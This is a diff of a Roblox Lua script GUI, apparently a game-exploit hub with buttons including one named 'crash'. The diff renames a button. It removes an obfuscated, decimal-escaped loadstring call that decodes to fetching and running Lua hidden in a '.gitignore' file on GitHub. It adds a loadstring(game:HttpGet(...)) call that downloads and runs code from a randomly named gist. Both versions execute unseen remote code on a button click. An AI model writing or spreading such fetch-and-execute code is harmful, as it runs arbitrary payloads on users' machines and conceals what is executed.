@@ -400,23 +400,11 @@ dahood.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
 dahood.Position = UDim2.new(0, 0, 0.243902445, 0)
 dahood.Size = UDim2.new(0, 106, 0, 20)
 dahood.Font = Enum.Font.SourceSans
-dahood.Text = "da hood (bad game)"
+dahood.Text = "r6emotes"
 dahood.TextColor3 = Color3.fromRGB(0, 0, 0)
 dahood.TextSize = 14.000
 dahood.MouseButton1Down:connect(function()
-	pcall(function()
-		if not game:IsLoaded() then
-			repeat
-				wait()
-			until game:IsLoaded()
-		end
-		if game:IsLoaded() then
-			for Valiant=1,1 do
-				wait()
-				loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\86\97\110\105\115\50\53\50\47\118\97\108\105\97\110\116\47\109\97\105\110\47\46\103\105\116\105\103\110\111\114\101\39\41\44\32\116\114\117\101\41\41\40\41\10")()
-			end
-		end
-	end)
+	loadstring(game:HttpGet("https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/37eef2120d509b37b31fa73944ab2361/raw/kT2fVEFnzDfCRXAP"))()
 end)
 
 crash.Name = "crash"
